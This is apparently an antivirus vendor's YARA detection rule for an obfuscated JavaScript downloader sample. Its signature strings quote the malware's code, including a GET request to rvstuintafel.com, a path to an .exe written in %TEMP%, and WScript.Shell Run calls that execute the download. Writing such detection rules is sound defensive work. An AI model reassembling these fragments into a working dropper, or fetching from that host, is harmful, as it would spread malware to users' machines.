rule sig_20160328_31979f1794c938cdea7b6be151fb4842 {
  meta:
    description = "datamaliciousorder - file 20160328_31979f1794c938cdea7b6be151fb4842.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "19116a75f5baefe0c7ea67330ee2b009967ae04633db556583c7eaec5da47bd0"

  strings:
    $s1  = "function Xqcxflwxfu() {return Mfyscvnmi[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"rBgEky12MYt.exe\";};" fullword ascii
    $s2  = "Xiraubqd[Ddtxev](\"GET\", \"http://rvstuintafel.com/aqp9ik\", false);" fullword ascii
    $s3  = "do {WScript[Lofbk](Qcvuzajnex() * 11)} while (Xiraubqd[\"readystate\"] < 2 * 2);" fullword ascii
    $s4  = "var Mfyscvnmi = function Cqhhnngr() {return WScript[Ecbhh](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Fjthgpawlw(Zzdrknz, Cfbdinc){return Zzdrknz - Cfbdinc;};" fullword ascii
    $s6  = "function Atcgiceis() {return ((Oyjjivfemr == true) && (Oyjjivfemr == Dwsbun)) ? 1 : Vfrccevej;};" fullword ascii
    $s7  = "function Rlbsepxsm(Hhsgtst){Mfyscvnmi[\"Run\"](Hhsgtst, Vfrccevej, Vfrccevej);};" fullword ascii
    $s8  = "var Ixitfiskbf = new this[\"Date\"]();" fullword ascii
    $s9  = "function Mfuqc(){return Ecbhh;};" fullword ascii
    $s10 = "var Oyjjivfemr = false;" fullword ascii
    $s11 = "function Aiqrcjyz()" fullword ascii
    $s12 = "Dwsbun = true; " fullword ascii
    $s13 = "var Dwsbun = false;" fullword ascii
    $s14 = "function Ejsoyzhcz(){return Cknmaw;};" fullword ascii
    $s15 = " while (Tsgoj){" fullword ascii
    $s16 = "function Qdpuhnsxq(Jxsigck) {var Psgjdwv = (1, 2, 3, 4, 5, Jxsigck); return Psgjdwv;};" fullword ascii
    $s17 = "return Fjthgpawlw(Ukbzzep, Kdkvrwvu);" fullword ascii
    $s18 = "function Qcvuzajnex(){return 22;};" fullword ascii
    $s19 = "Oyjjivfemr = true; " fullword ascii
    $s20 = "} catch(Vxqcvy){Tsgoj = (\"asdfa\", \"fadfasdf\", \"afdafa\", 2);};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}